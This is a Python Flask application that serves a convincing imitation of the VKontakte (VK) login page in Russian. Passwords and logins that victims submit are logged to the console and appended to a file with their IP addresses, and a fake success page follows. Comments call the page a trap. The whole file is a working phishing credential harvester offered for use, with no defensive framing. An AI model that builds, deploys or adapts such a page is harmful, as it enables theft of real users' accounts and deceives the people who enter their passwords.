from flask import Flask, request
import logging
import sys
import os
from datetime import datetime

# Максимальное логирование для Render
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/tmp/vk.log', mode='a')
    ],
    force=True
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    # Логируем ВСЕ запросы
    logger.info(f"📥 ЗАПРОС: {request.method} | IP: {request.remote_addr} | UA: {request.headers.get('User-Agent', 'N/A')[:50]}")
    
    if request.method == 'POST':
        login_data = request.form.get('email', '').strip()
        password_data = request.form.get('pass', '').strip()
        
        # ГЛАВНОЕ ЛОГИРОВАНИЕ - видно в Render Logs!
        logger.info("=" * 50)
        logger.info(f"🔥 ЛОГ-СЕРВЕР: лог: '{login_data}'")
        logger.info(f"🔥 ПАРОЛЬ-СЕРВЕР: пароль: '{password_data}'")
        logger.info("=" * 50)
        
        # Дублируем через print() для 100% видимости
        print(f"🚨 ЛОВУШКА VK | лог: {login_data} | пароль: {password_data}")
        print(f"📱 IP: {request.remote_addr} | Время: {datetime.now()}")
        
        # Сохраняем в файл
        with open('/tmp/vk_creds.txt', 'a') as f:
            f.write(f"{datetime.now()} | {request.remote_addr} | лог: {login_data} | пароль: {password_data}\n")
        
        return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VK - Успешный вход</title>
    <style>
        body { font-family: system-ui; background: linear-gradient(135deg, #667eea, #764ba2); min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .success { background: rgba(255,255,255,0.95); padding: 60px 40px; border-radius: 24px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2); max-width: 400px; width: 90%; }
        .check { font-size: 80px; color: #4bb34b; margin-bottom: 20px; }
        .title { font-size: 28px; color: #2c3657; margin-bottom: 10px; }
        .text { color: #666; margin-bottom: 30px; }
        .back { background: #5181b8; color: white; padding: 15px 30px; border: none; border-radius: 12px; text-decoration: none; font-weight: 500; display: inline-block; }
    </style>
</head>
<body>
    <div class="success">
        <div class="check">✅</div>
        <div class="title">Добро пожаловать!</div>
        <div class="text">Вы успешно вошли в ВКонтакте</div>
        <a href="/" class="back">← Новый вход</a>
    </div>
</body>
</html>
        '''
    
    # VK LOGIN FORM (ПОЛНЫЙ ДИЗАЙН)
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ВКонтакте</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); 
            min-height: 100vh; 
            display: flex; align-items: center; justify-content: center; padding: 20px;
        }
        .form { 
            background: rgba(255,255,255,0.97); 
            backdrop-filter: blur(25px); 
            border-radius: 24px; 
            padding: 50px 40px; 
            box-shadow: 0 30px 60px rgba(0,0,0,0.2); 
            max-width: 380px; width: 100%; 
            text-align: center;
        }
        .logo { 
            font-size: 36px; font-weight: 800; 
            background: linear-gradient(135deg, #5181b8, #456fa0); 
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
            margin-bottom: 10px; 
        }
        .title { color: #2c3657; font-size: 22px; font-weight: 600; margin-bottom: 35px; }
        .input { 
            width: 100%; padding: 20px 24px; 
            border: 2px solid #e6e8f0; border-radius: 16px; 
            font-size: 16px; margin-bottom: 20px; 
            transition: all 0.3s; background: rgba(255,255,255,0.8);
        }
        .input:focus { 
            outline: none; border-color: #5181b8; 
            box-shadow: 0 0 0 4px rgba(81,129,184,0.15); 
            transform: translateY(-2px);
        }
        .submit { 
            background: linear-gradient(135deg, #5181b8 0%, #456fa0 100%); 
            color: white; border: none; 
            padding: 20px; border-radius: 16px; 
            font-size: 18px; font-weight: 600; 
            cursor: pointer; width: 100%; 
            transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px;
        }
        .submit:hover { 
            transform: translateY(-3px); 
            box-shadow: 0 20px 40px rgba(81,129,184,0.4); 
        }
        .forgot { margin: 25px 0; }
        .forgot a { color: #5181b8; text-decoration: none; font-size: 15px; }
        .register { 
            background: linear-gradient(135deg, #4bb34b 0%, #3d9b3d 100%); 
            color: white; text-decoration: none; 
            padding: 18px; border-radius: 16px; 
            font-weight: 500; display: block; 
            margin-top: 25px; transition: all 0.3s;
        }
        .register:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(75,179,75,0.4); }
    </style>
</head>
<body>
    <div class="form">
        <div class="logo">VK</div>
        <div class="title">Войдите на сайт</div>
        
        <form method="POST" action="/">
            <input type="text" class="input" name="email" placeholder="Телефон или почта" required autocomplete="username">
            <input type="password" class="input" name="pass" placeholder="Пароль" required autocomplete="current-password">
            <button type="submit" class="submit">Войти</button>
        </form>
        
        <div class="forgot"><a href="#">Забыли пароль?</a></div>
        <div style="color: #818c98; font-size: 14px; margin: 20px 0;">Первый раз на ВК?</div>
        <a href="#" class="register">Зарегистрироваться</a>
    </div>
    
    <script>
    document.querySelector('form').addEventListener('submit', function(){
        console.log('✅ Форма отправлена!');
    });
    </script>
</body>
</html>
    '''

@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
